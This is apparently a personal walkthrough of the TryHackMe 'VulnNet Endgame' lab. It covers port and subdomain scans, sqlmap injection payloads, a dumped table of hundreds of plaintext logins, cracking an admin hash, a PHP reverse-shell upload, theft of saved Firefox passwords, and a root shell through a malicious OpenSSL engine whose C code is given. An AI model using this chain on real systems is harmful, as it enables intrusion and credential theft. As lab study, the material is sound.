@@ -1,0 +1,674 @@
+ip:10.10.72.162
+
+nnap
+
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 bb:2e:e6:cc:79:f4:7d:68:2c:11:bc:4b:63:19:08:af (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQRQ5sGPZniwdg1TNW71UdA6dc2k3lpZ68EnacCUgKEqZT7sBvppGUJjSAMY7aZqdZJ0m5N9SQajB9iW3ZEKHM5qtbXOadbWkRKp3VrqtZ8VW1IthLa2+oLObY2r1qep6O2NqrghQ/yVCbJYF5H8BsTtjCVNBeVSzf9zetwUviO6xfqIRO3iM+8S2WpZwKGtrBFvA9RaBsqLBGB1XGUjufKxyRUzOx1J2I94Xhs/bDcaOV5Mw6szyZCM4ZkxmQ1fddQawxHfmZRnqxVogoHDsOGgh9tpQsc+S/KTrYQa9oFEVARV70x
+|   256 80:61:bf:8c:aa:d1:4d:44:68:15:45:33:ed:eb:82:a7 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEg9Hw4CIelacGVS0U+uFcwEj183dT+WrY/tvJV4U8/1alrGM/8gIKHEQIsU4yGPtyQ6M8xL9q7ak6ze+YsHd2o=
+|   256 87:86:04:e9:e0:c0:60:2a:ab:87:8e:9b:c7:05:35:1c (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJJDCCks5eMviLJyDQY/oQ3LLgnDoXvqZS0AxNAJGv9T
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+gobuster
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/css (Status: 301)
+/fonts (Status: 301)
+/images (Status: 301)
+/index.html (Status: 200)
+/js (Status: 301)
+/server-status (Status: 403)
+
+
+
+
+
+└─$ nikto -h http://vulnnet.thm                                                                                                                                                                                                                                                       1 ⨯
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.10.72.162
++ Target Hostname:    vulnnet.thm
++ Target Port:        80
++ Start Time:         2022-12-27 10:49:14 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: 10fa, size: 5e07a2716f080, mtime: gzip
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ OSVDB-3092: /css/: This might be interesting...
++ OSVDB-3268: /images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7785 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2022-12-27 10:59:51 (GMT-5) (637 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+
+subdomainnnnnnnn enum:
+
+ffuf -u http://vulnnet.thm -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: FUZZ.vulnnet.thm' -fs 0 -fs 65
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.5.0 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://vulnnet.thm
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.vulnnet.thm
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+ :: Filter           : Response size: 65
+________________________________________________
+
+blog                    [Status: 200, Size: 19316, Words: 1236, Lines: 391, Duration: 76ms]
+api                     [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 256ms]
+shop                    [Status: 200, Size: 26701, Words: 11619, Lines: 525, Duration: 3889ms]
+admin1                  [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 4039ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 540 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
+
+
+added admin1 to /etc/hosts
+
+vulnnet management panel is up! 
+
+enumerate admin1.vulnnet.thm
+
+dirb http://admin1.vulnnet.thm                                       
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Dec 27 11:09:12 2022
+URL_BASE: http://admin1.vulnnet.thm/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://admin1.vulnnet.thm/ ----
+^[^[^[                                                                                                                                                                                                                                                                                    ==> DIRECTORY: http://admin1.vulnnet.thm/en/                                                                                                                                                                                                                                             
+==> DIRECTORY: http://admin1.vulnnet.thm/fileadmin/                                                                                                                                                                                                                                      
++ http://admin1.vulnnet.thm/server-status (CODE:403|SIZE:283)                                                                                                                                                                                                                            
+==> DIRECTORY: http://admin1.vulnnet.thm/typo3/                                                                                                                                                                                                                                          
+==> DIRECTORY: http://admin1.vulnnet.thm/typo3conf/                                                                                                                                                                                                                                      
+==> DIRECTORY: http://admin1.vulnnet.thm/typo3temp/                                                                                                                                                                                                                                      
+==> DIRECTORY: http://admin1.vulnnet.thm/vendor/ 
+
+
+we have typo3 cms but default creds don't work
+
+visit
+blog.vulnnet.thm and click on first post then view page source there is a reference to :
+api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1
+
+change blog=1 to something nonexistent
+
+api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=999 or 1=1 and we have sql injection
+
+time to use sqlmap to dump databases
+
+sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbs                             
+[...]
+[00:40:33] [INFO] GET parameter 'blog' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[00:40:40] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[...]
+[00:43:35] [INFO] GET parameter 'blog' appears to be 'MySQL >= 5.0.12 OR time-based blind (SLEEP)' injectable
+[...]
+[00:44:02] [INFO] GET parameter 'blog' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'blog' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 79 HTTP(s) requests:
+---
+Parameter: blog (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: blog=1 AND 9729=9729
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind (SLEEP)
+    Payload: blog=1 OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: blog=-9075 UNION ALL SELECT CONCAT(0x7176717671,0x72576a667762514c4a48736172554a6d677548546a724163455949526b53546f6153495564735376,0x71766a6b71),NULL,NULL-- -
+---
+[00:44:24] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu 18.04 (bionic)
+web application technology: Apache 2.4.29
+back-end DBMS: MySQL >= 5.0.12
+[00:44:41] [INFO] fetching database names
+available databases [3]:
+[*] blog
+[*] information_schema
+[*] vn_admin
+
+there are 3 dbs: blog,information_schema,vn_admin
+
+dump tttables from vn_admin
+sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D vn_admin --tables
+
+fetching tables for database: 'vn_admin'
+Database: vn_admin
+[48 tables]
++---------------------------------------------+
+| backend_layout                              |
+| be_dashboards                               |
+| be_groups                                   |
+| be_sessions                                 |
+| be_users                                    |
+| cache_adminpanel_requestcache               |
+| cache_adminpanel_requestcache_tags          |
+| cache_hash                                  |
+| cache_hash_tags                             |
+| cache_imagesizes                            |
+| cache_imagesizes_tags                       |
+| cache_pages                                 |
+| cache_pages_tags                            |
+| cache_pagesection                           |
+| cache_pagesection_tags                      |
+| cache_rootline                              |
+| cache_rootline_tags                         |
+| cache_treelist                              |
+| fe_groups                                   |
+| fe_sessions                                 |
+| fe_users                                    |
+| pages                                       |
+| sys_be_shortcuts                            |
+| sys_category                                |
+| sys_category_record_mm                      |
+| sys_collection                              |
+| sys_collection_entries                      |
+| sys_file                                    |
+| sys_file_collection                         |
+| sys_file_metadata                           |
+| sys_file_processedfile                      |
+| sys_file_reference                          |
+| sys_file_storage                            |
+| sys_filemounts                              |
+| sys_history                                 |
+| sys_language                                |
+| sys_lockedrecords                           |
+| sys_log                                     |
+| sys_news                                    |
+| sys_note                                    |
+| sys_redirect                                |
+| sys_refindex                                |
+| sys_registry                                |
+| sys_template                                |
+| tt_content                                  |
+| tx_extensionmanager_domain_model_extension  |
+| tx_extensionmanager_domain_model_repository |
+| tx_impexp_presets            
+
+
+Table be_users looks like is: backend_users, which holds administrator credentials!
+
+Enumerate database vn_admin table be_users’s column names:
+
+sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D vn_admin -T be_users --columns
+
+
+Database: vn_admin
+Table: be_users
+[34 columns]
++-----------------------+----------------------+
+| Column                | Type                 |
++-----------------------+----------------------+
+| admin                 | smallint(5) unsigned |
+| allowed_languages     | varchar(255)         |
+| avatar                | int(10) unsigned     |
+| category_perms        | text                 |
+| crdate                | int(10) unsigned     |
+| createdByAction       | int(11)              |
+| cruser_id             | int(10) unsigned     |
+| db_mountpoints        | text                 |
+| deleted               | smallint(5) unsigned |
+| description           | text                 |
+| disable               | smallint(5) unsigned |
+| disableIPlock         | smallint(5) unsigned |
+| email                 | varchar(255)         |
+| endtime               | int(10) unsigned     |
+| file_mountpoints      | text                 |
+| file_permissions      | text                 |
+| lang                  | varchar(6)           |
+| lastlogin             | int(10) unsigned     |
+| lockToDomain          | varchar(50)          |
+| options               | smallint(5) unsigned |
+| password              | varchar(100)         |
+| pid                   | int(10) unsigned     |
+| realName              | varchar(80)          |
+| starttime             | int(10) unsigned     |
+| TSconfig              | text                 |
+| tstamp                | int(10) unsigned     |
+| uc                    | mediumblob           |
+| uid                   | int(10) unsigned     |
+| usergroup             | varchar(255)         |
+| usergroup_cached_list | text                 |
+| userMods              | text                 |
+| username              | varchar(50)          |
+| workspace_id          | int(11)              |
+| workspace_perms       | smallint(6)          |
++-----------------------+----------------------+
+
+Let’s extract username and password column!
+
+sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D vn_admin -T be_users -C username,password --dump
+Database: vn_admin
+Table: be_users
+[1 entry]
++----------+---------------------------------------------------------------------------------------------------+
+| username | password                                                                                          |
++----------+---------------------------------------------------------------------------------------------------+
+| chris_w  | $argon2i$v=19$m=65536,t=16,p=2$UnlVSEgyMUFnYnJXNXlXdg$j6z3IshmjsN+CwhciRECV2NArQwipqQMIBtYufyM4Rg |
+
+
+et’s enumerate database blog then.
+
+Enumerate database blog’s table names:
+sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D blog --tables
+
+Database: blog
+[4 tables]
++------------+
+| blog_posts |
+| details    |
+| metadata   |
+| users      |
++------------+
+
+Table users? That’s odd.
+
+Enumerate database blog table users’s column names:
+
+Database: blog
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(11)     |
+| password | varchar(50) |
+| username | varchar(50) |
++----------+-------------+
+
+
+
+Extract username and password data:
+
+ sqlmap -u "http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1" -p blog --dbms=mysql -D blog -T users -C username,password --dump
+
+ Database: blog
+Table: users
+[651 entries]
++--------------------+---------------------+
+| username           | password            |
++--------------------+---------------------+
+[12:11:53] [WARNING] console output will be trimmed to last 256 rows due to large table size
+| lspikinsaz         | D8Gbl8mnxg          |
+| profeb0            | kLLxorKfd           |
+| sberrymanb1        | cdXAJAR             |
+| ajefferiesb2       | 0hdeFiZBRJ          |
+| hkibblewhiteb3     | 6rl6qXSJDrr         |
+| dtremayneb4        | DuYMuI              |
+| bflewinb5          | fwbk0Vgo            |
+| kmolineuxb6        | 92Fb3vBF5k75        |
+| fjosefsb7          | zzh9wheBjX          |
+| tmiskellyb8        | sAGTlyBrb5r         |
+| nallrightb9        | 3uUPdL              |
+| hlevermoreba       | fp2LW0x             |
+| celgerbb           | IKhg7D              |
+| frustedbc          | Tjyu2Ch2            |
+| imeneghibd         | NgKgdeKRVEK         |
+| vgouninbe          | wGWMg3d             |
+| cbartoschbf        | ruTxBc2n85          |
+| lcordonbg          | ZydELwZFV2          |
+| dappsbh            | ROfVmvZSYS          |
+| zduchanbi          | B4SBGt5yAD          |
+| jfraybj            | zhE95JJX9l          |
+| mlanchesterbk      | nXSVHhVW9S          |
+| cgylesbl           | NCeU070             |
+| cbonnifacebm       | WzkvfoedkXJx        |
+| btoppasbn          | ktPBpK1             |
+| mdurrettbo         | 8fCXE6BF9gj         |
+| skilroybp          | cSAjOy              |
+| uvonderemptenbq    | HLUHZ9oQ            |
+| dvinsenbr          | gTc7TiSsd2          |
+| ltiltbs            | 7yQ0b1B             |
+| dsimcoebt          | SXD1eC6ysa          |
+| wfrailbu           | bgb084kq            |
+| lmityukovbv        | NsJFz4DLpI          |
+| vkellarbw          | 7JVPatN             |
+| rkingstonbx        | yuTnSPEvIoJ4        |
+| rbakewellby        | L3ttm8              |
+| dbousteadbz        | vyae6t              |
+| vstaddenc0         | iA4AD4UlcLF1        |
+| rwhacketc1         | VlyIAh              |
+| tnoorc2            | IpsnIEbIaT          |
+| dduffync3          | UPU9rZu8q           |
+| dstichelc4         | xuUXUFXoc           |
+| kcleverlyc5        | yTuqouj9ZK          |
+| sreinertc6         | QDneobZ1DH          |
+| mcottinghamc7      | OdrnoHtrP           |
+| ljansemac8         | c3KvR6              |
+| acodac9            | GMbFP9              |
+| rhuggardca         | zIZ11OPuj           |
+| gkeechcb           | XCX2GVx             |
+| syurincc           | nJQgYR2uOyZq        |
+| agaulecd           | AQlFlPvf            |
+| wboijce            | zj6vR6Bf            |
+| kphifercf          | eL5uJnLD2           |
+| abenglecg          | 7HEMdTc07           |
+| emarkingch         | VbzVZoYn            |
+| nmuldowneyci       | wln8WN3PJ           |
+| jbygrovecj         | 3AcKBTHRN           |
+| bduxburyck         | 32ZXql9Uw8          |
+| fthewcl            | 2pnBsk6i            |
+| kmeececm           | JxcEXKAN            |
+| bholligancn        | rkyCMLwOIt          |
+| bferonetco         | KlxQ4Vxl            |
+| jcraycp            | OFc5f2              |
+| hethertoncq        | SsLMTxbw            |
+| cclayecr           | nUpdnCZW1cqr        |
+| tmcbreartycs       | 0I7ldSNbm           |
+| oderuggieroct      | gqQeawiZ            |
+| rdoerscu           | djQBjW3pk           |
+| karbucklecv        | G9FarmKd            |
+| bbuckbycw          | lXCoFI              |
+| ldixseecx          | WAMRuFTTI3          |
+| jmahedycy          | diVq6PDeEpz         |
+| gdamrellcz         | bV6cXPOFfLg         |
+| sgarrettd0         | dCrF5fv             |
+| plaurenceaud1      | Q4gYmlM             |
+| kmcgeacheyd2       | SnvFrSB6AB          |
+| mhopewelld3        | qiehVyQ             |
+| chottond4          | At9A4aCJos          |
+| hsellandd5         | 8T9v08352re         |
+| syegorkovd6        | y8chyGC9js          |
+| adavisond7         | ghMz6e68c1Z         |
+| amewisd8           | 00S7q8S1f8W         |
+| lorpind9           | 2rruluVz0SwY        |
+| jbilovskyda        | hXaVYfHUZoz         |
+| jhalforddb         | j7GAP4v             |
+| wcolisbedc         | 0MM46yTEVBL2        |
+| cgreastydd         | QUDViFUxO           |
+| ajackde            | YGcBpM              |
+| cmcgarritydf       | 2js9AM              |
+| tjostdg            | oJ38KUXgm           |
+| lguidendh          | KP9DmIk             |
+| mbletsodi          | qNYURfhw            |
+| wsneesbydj         | jDmbnZJi            |
+| glerouxdk          | t8xlAuAvH8Yj        |
+| yhaythornthwaitedl | TTin1up             |
+| nzmitrovichdm      | 0ftVkbqP            |
+| jgodballdn         | Kwcozh              |
+| jkiddeydo          | TWnwDTB             |
+| acaghandp          | IxQgXLrw            |
+| rattestonedq       | AxuOsAA0lqrc        |
+| mmichallatdr       | GCpyVf              |
+| rgaitoneds         | YnPCjKg             |
+| krobbekedt         | NOYhOlnC            |
+| nknollerdu         | pjSBcAVD            |
+| wshemeltdv         | 5RigTGe             |
+| rpeperelldw        | jwKMTMu             |
+| lbescobydx         | 4qfwbKNed3I         |
+| jparishdy          | qSX9N1Kf8XJ         |
+| jminghidz          | AoIrka              |
+| nforthe0           | Ft4xVROXXCd5        |
+| tklemensiewicze1   | x3WIaoX99yb         |
+| epotterye2         | hXcrFv              |
+| lbrugmanne3        | 6ZtJhp4col          |
+| adencse4           | bqItfg4wf           |
+| cfloreze5          | 5W4lM81DPo          |
+| amatanine6         | IT6p5HT             |
+| fchalkere7         | 0Q6T9jvAZB          |
+| rytere8            | M7lvtAz6oRNS        |
+| cstillee9          | MpO7FgPoz           |
+| cbashamea          | 8rIuhW0VZ           |
+| flyeseb            | OS15i4              |
+| gtieryec           | Usl7mH2H            |
+| sborgheseed        | WDAliOAKFj7f        |
+| hmctrustyee        | iwpk0YC             |
+| wvigeref           | lN8d6g1             |
+| nbockeneg          | nuwPbeTIgX8F        |
+| ffranzmaneh        | LvBDyc9JRPV         |
+| drippingaleei      | ncpiXJX             |
+| achambersej        | vQUTz2xEyWx4        |
+| fsuarezek          | wQcbURC             |
+| kaspoleel          | irTEDl2k            |
+| mmursellem         | H6WyTMdy            |
+| szecchinellien     | pukixtg             |
+| cnewlineo          | Or6dtgSGmd          |
+| cmccrowep          | VhkvlZO             |
+| shavershameq       | slncO0kvmb          |
+| jtumeltyer         | svJ4749mzdJ         |
+| cmathivates        | weR5eukJOX6C        |
+| btarzeyet          | rp8sqUpw            |
+| fstedmaneu         | 8T7UFX              |
+| mgaitoneev         | SkuuzEsAZ           |
+| zscotlandew        | RIs9MA              |
+| dfurbyex           | ttKwcGDELB          |
+| sdallowey          | PVVOkQqHVdU         |
+| lmccormackez       | Szh74h              |
+| arenneyf0          | wMkLVr0             |
+| lbodegaf1          | 4Bux8MCHXS          |
+| rsantostefanof2    | ZXIOChbv            |
+| mvaissieref3       | PcJPLBJf            |
+| csolwayf4          | kgjhKzMWYakS        |
+| pwaddingtonf5      | p69xguJZe           |
+| kchaffeyf6         | ntswwsY             |
+| zgooblef7          | lh0Llscj            |
+| pwassf8            | uqzWk2PYLJR7        |
+| bmcclenaghanf9     | eIZQxLh             |
+| bhaddintonfa       | IDp96W1RUb          |
+| rblesingfb         | Z7MGodFb            |
+| mblownefc          | caw1QQ1             |
+| lwhitlandfd        | QpPSspEWus          |
+| lgoftonfe          | u6ZBlHvmId          |
+| vdubbleff          | BvZ0JJNVWCX         |
+| dfrenschfg         | Ih1thIl             |
+| gofarrisfh         | jmjhYpmgg           |
+| kpipkinfi          | LFXCNqt5hN          |
+| sshilstonfj        | tofKHos             |
+| lstanistreetfk     | fCMRSGm4BzNQ        |
+| ktomasellifl       | zFdwNg16yCdB        |
+| fmarkhamfm         | qJhjNz0sK7Z         |
+| bledingtonfn       | wmd4CD60            |
+| yzettoifo          | mZjvZC              |
+| coganfp            | 7MeBiB7             |
+| sdibollfq          | VCV8FqINn           |
+| blampkinfr         | OsZxivx             |
+| mfachefs           | HVBEN4              |
+| kburelft           | m9R8setEC           |
+| bgrimsdithfu       | q1SivtRlbetm        |
+| ctolemanfv         | fRnopRDUrds         |
+| awhiteheadfw       | eZ3TzXtdD           |
+| mchislettfx        | Uh2kDLMNFeej        |
+| lreichardtfy       | Ln6WDY              |
+| bjossfz            | kGBl9CgCPcGF        |
+| hprevostg0         | TuK60tJ             |
+| rpritchettg1       | mwTGls              |
+| dantonssong2       | Ym2cHtkuW           |
+| gmantrupg3         | axZcgE9T            |
+| dsimioneg4         | 6LFtl39ggEtI        |
+| lmiddleg5          | 79hJw4u             |
+| amcquorkelg6       | UdPazP              |
+| mellwandg7         | hFdDjfcdwCja        |
+| ddunbobing8        | w9Copz4             |
+| cszabog9           | K67Hs5              |
+| cdorbonga          | molOCywSVk          |
+| fridgwellgb        | wWQpqk              |
+| ksiregc            | Ipmq9QvTymr         |
+| hwhardleygd        | 7v4eltt3Kuw         |
+| hpoppletonge       | ctvNF49tuT          |
+| aghidoligf         | hFgxHo5Xp           |
+| fstilinggg         | g4St9w              |
+| ebodechongh        | DTSos9KOFhIO        |
+| rbennellickgi      | 0lj1adMG            |
+| gnaldergj          | kNEDmUrVp           |
+| preygk             | 8kt6CKNTc           |
+| cjigglegl          | Khmoz3bGQiwo        |
+| aburgisgm          | 2UrQCd16gtqN        |
+| nluddygn           | yQrAEzZxK           |
+| lcluttengo         | TeFpfcTSt4K         |
+| laseefgp           | Q8vHxue1            |
+| wdovergq           | 8sNg5H              |
+| bjackesgr          | BB2ymU              |
+| sphebeygs          | CTCPBoG             |
+| hhushergt          | KoM1f3mmxlC         |
+| dmowatgu           | H9fzdE              |
+| vgoodhandgv        | OQ4Axwb             |
+| vcocktongw         | zo9YGPcnoFY         |
+| afrackiewiczgx     | wNfgrMLd92          |
+| wmccorkellgy       | L70zF2              |
+| mbaldersongz       | vjlPxrlrB1          |
+| jdovingtonh0       | 1fDBrk              |
+| tlunneyh1          | NVQobq              |
+| lwaulkerh2         | 4IHZylSa6uSk        |
+| nceccolih3         | 6mqTbfJcyB          |
+| aworsnuph4         | BtdoQGpOg           |
+| pwheelhouseh5      | HA5wRx2Xkt          |
+| ashearsh6          | rsQIXNF4p56t        |
+| bhendriksh7        | DD87MyB             |
+| tgrovierh8         | EqEt2NXw37Q         |
+| kspanswickh9       | oN9I8Sf             |
+| krattrayha         | HkZs0YLv            |
+| anorcockhb         | LTSB3oaxy9          |
+| kneathc            | 2lOIMadSDW2         |
+| ajaggarhd          | 2YDcmeZaKwig        |
+| krossbrookehe      | 7pA32uFwx8eh        |
+| lpavelhf           | yoWnriWXeTc         |
+| agaitskillhg       | OglY7vT0Pyn         |
+| bmylechreesthh     | GBCtL62Xa           |
+| hsimenothi         | JdHOJPdpZV          |
+| bbrunihj           | PT8RllCQ            |
+| sroysonhk          | bJR3DOVL            |
+| bmarrinerhl        | yoJwhOI             |
+| ataillanthm        | tfncTGLw            |
+| acassamhn          | dBcYuQwU            |
+| kfruchonho         | s6QjWpLo            |
+| kdenyakinhp        | LTbmsk6T            |
+| mhundyhq           | xrbjFjA8p           |
+| zcatchesidehr      | gaMmTSLHkMZE        |
+| anorcrosshs        | VH3FsbYfk           |
+| kklavesht          | YY6hmavoD           |
+| bloghanhu          | kElKt4              |
+| ekayzerhv          | 4eHrdt5Z            |
+| jovenhw            | 2QZrPJ2             |
+| gboayshx           | t0xmZtLTXa          |
+| asuermeiershy      | 09jD21OoQ           |
+| msambidgehz        | OBJZD6f             |
+| bhuertai0          | Cc4QOkuSvrF         |
+| oboatmani1         | kSKBUj8             |
+| rtamblingi2        | BIkqvmX             |
++--------------------+---------------------+
+
+crack chris_v hash
+
+john chris.hash --wordlist=passlist.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (argon2 [Blake2 AVX])
+Cost 1 (t) is 16 for all loaded hashes
+Cost 2 (m) is 65536 for all loaded hashes
+Cost 3 (p) is 2 for all loaded hashes
+Cost 4 (type [0:Argon2d 1:Argon2i]) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+vAxWtmNzeTz      (?)     
+1g 0:00:00:22 DONE (2022-12-28 05:03) 0.04434g/s 5.676p/s 5.676c/s 5.676C/s KmYlhMmg..Z2WgzYZCK
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+log on to typo3
+chris_w, vAxWtmNzeTz
+
+Go to “Settings” -> “Configure Installation-Wide Options” -> “[BE][fileDenyPattern]” and remove all patterns
+
+upload php-reverse shell
+
+start nc listener
+
+then  curl http://admin1.vulnnet.thm/fileadmin/user_upload/php-reverse-shell.php  
+
+stabilise shell with python
+
+go to home/system and zip .mozzila file
+zip -r /tmp/browser.rar /home/system/.mozilla/
+
+host the file adn download it to your machine
+
+Clone Firefox Decrypt repository from GitHub:
+then
+
+python3 /opt/firefox_decrypt/firefox_decrypt.py /home/kali/Practice/tryhackme/Endgame/home/system/.mozilla/firefox/2fjnrwth.default-release 
+2022-12-28 05:57:06,212 - WARNING - profile.ini not found in /home/kali/Practice/tryhackme/Endgame/home/system/.mozilla/firefox/2fjnrwth.default-release
+2022-12-28 05:57:06,212 - WARNING - Continuing and assuming '/home/kali/Practice/tryhackme/Endgame/home/system/.mozilla/firefox/2fjnrwth.default-release' is a profile location
+
+Website:   https://tryhackme.com
+Username: 'chris_w@vulnnet.thm'
+Password: '8y7TKQDpucKBYhwsb'
+
+ssh to 10.10.17.71 using system and pass
+
+read user.txt
+
+privEsc:
+upload Linpeas
+We have cap_setuid capability and library load feature in OpenSSL 
+
+To exploit this, create an ‘exploit.c’ file with contents as shown below.
+
+#include <openssl/engine.h>
+
+static int bind(ENGINE *e, const char *id)
+{
+  setuid(0); setgid(0);
+  system("/bin/bash");
+}
+
+IMPLEMENT_DYNAMIC_BIND_FN(bind)
+IMPLEMENT_DYNAMIC_CHECK_FN()
+
+Run the following:
+
+gcc -fPIC -o exploit.o -c exploit.c
+gcc -shared -o exploit.so -lcrypto exploit.o
+
+
+Getting Root
+
+Upload the ‘exploit.so’ file to the target and make it executable
+
+Run the below command to get root shell.
+
+/home/system/Utils/openssl req -engine ./exploit.so
+
+Read root flag.
